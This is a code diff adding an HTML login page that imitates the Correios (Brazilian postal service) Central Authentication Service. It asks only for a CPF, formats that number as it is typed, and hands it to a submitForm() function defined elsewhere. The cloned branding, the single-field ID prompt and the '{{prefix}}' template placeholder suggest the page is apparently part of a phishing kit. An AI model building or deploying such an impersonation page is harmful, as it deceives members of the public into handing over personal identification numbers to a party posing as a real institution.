@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Login - CAS &#8211; Central Authentication Service</title>
+    <link rel="shortcut icon" href="/ect/img/favi-ect.png" type="image/x-icon">
+    <link rel="stylesheet" href="/ect/css/bunker.css" type="text/css">
+    <link rel="stylesheet" href="/ect/css/global5e1f.css?v=2" type="text/css">
+    <link rel="stylesheet" href="/ect/loginform.css" type="text/css">
+    <script type="module">
+        import { Spinner } from 'https://cdnjs.cloudflare.com/ajax/libs/spin.js/4.1.0/spin.min.js';
+
+        window.Spinner = Spinner; // Torna Spinner acessível globalmente
+    </script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spin.js/4.1.0/spin.min.css"/>
+
+    <style> 
+        .container {
+            max-width: 500px;  
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .campo label {
+            display: block;  
+            margin-bottom: 10px;  
+            text-align: center;  
+        }
+        .botoes {
+            text-align: center;  
+            margin-top: 20px;  
+        }
+        .botoes .primario {
+            width: 100%;  
+            padding: 10px;  
+            font-size: 16px;  
+        }
+    </style>
+</head>
+<body class="login mdc-typography">
+
+<section id="menu">
+    <a class="hamburger" tabindex="1"></a>
+    <a class="logo" href="#"></a>
+    <a class="pesquisar"></a>
+    <div class="menu oculto">
+        <section>
+            <h1>Correios - CAS</h1>
+        </section>
+        <a href="/">Problemas para acessar o Meu Correios?</a>
+        <a href="/">Sair</a>
+    </div>
+</section>
+
+<style>
+    #loadingOverlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5); /* Fundo semitransparente */
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999; /* Garantir que fique sobre todos os outros elementos */
+    }
+
+    #loadingSpinner {
+        /* O Spinner será inserido dinamicamente */
+    }
+</style>
+
+<div id="loadingOverlay" style="display: none;">
+    <div id="loadingSpinner"></div>
+</div>
+
+<main role="main">
+    <div id="content" class="ctn-tabela">
+        <div>
+            <section id="loginForm">
+                <section>
+                    <div class="container">
+                        <form id="fm1">
+                            <h4>Informe seu CPF</h4>
+                            <div class="campos">
+                                <div class="campo">
+                                    <div class="rotulo">
+                                        <label for="username">CPF</label>
+                                    </div>
+                                    <div class="controle">
+                                        <input class="form-control required" id="username" size="25" tabindex="1" type="text" accesskey="u" required autocomplete="off" name="username" value="" autofocus>
+                                    </div>
+                                </div>
+
+                                <div class="botoes">
+                                    <button class="primario" name="submitBtn" accesskey="l" type="button" onclick="submitForm()">LOGIN</button>
+                                </div>
+
+                                <div class="campo">
+                                    <p>Por motivos de segurança, saia do seu navegador quando terminar de acessar serviços que exigem autenticação!</p>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                </section>
+            </section>
+        </div>
+    </div> 
+</main>
+<script>
+    var prefix_ = "{{prefix}}"
+</script>
+<script src="/ect/js/menu.js"></script>
+<script src="/js/cpf.js"></script>
+<script type="text/javascript" src="/webjars/jquery/3.6.1/jquery.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const form = document.getElementById('fm1');
+
+        // Prevenir envio padrão ao pressionar Enter
+        form.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                event.preventDefault(); // Impede o envio do formulário
+                submitForm(); // Chama a função personalizada
+            }
+        });
+
+        const cpfInput = document.getElementById('username');
+
+        // Função para formatar CPF
+        function formatCPF(cpf) {
+            return cpf
+                .replace(/\D/g, '') // Remove caracteres não numéricos
+                .substring(0, 11) // Limita a 11 dígitos numéricos
+                .replace(/(\d{3})(\d)/, '$1.$2') // Insere o primeiro ponto
+                .replace(/(\d{3})(\d)/, '$1.$2') // Insere o segundo ponto
+                .replace(/(\d{3})(\d{1,2})$/, '$1-$2'); // Insere o hífen
+        }
+
+        // Evento de input para formatar e validar o CPF
+        cpfInput.addEventListener('input', function() {
+            let cpf = cpfInput.value;
+
+            // Formatar CPF com limite
+            cpfInput.value = formatCPF(cpf);
+        });
+    });
+</script>
+
+
+</body>
+</html>
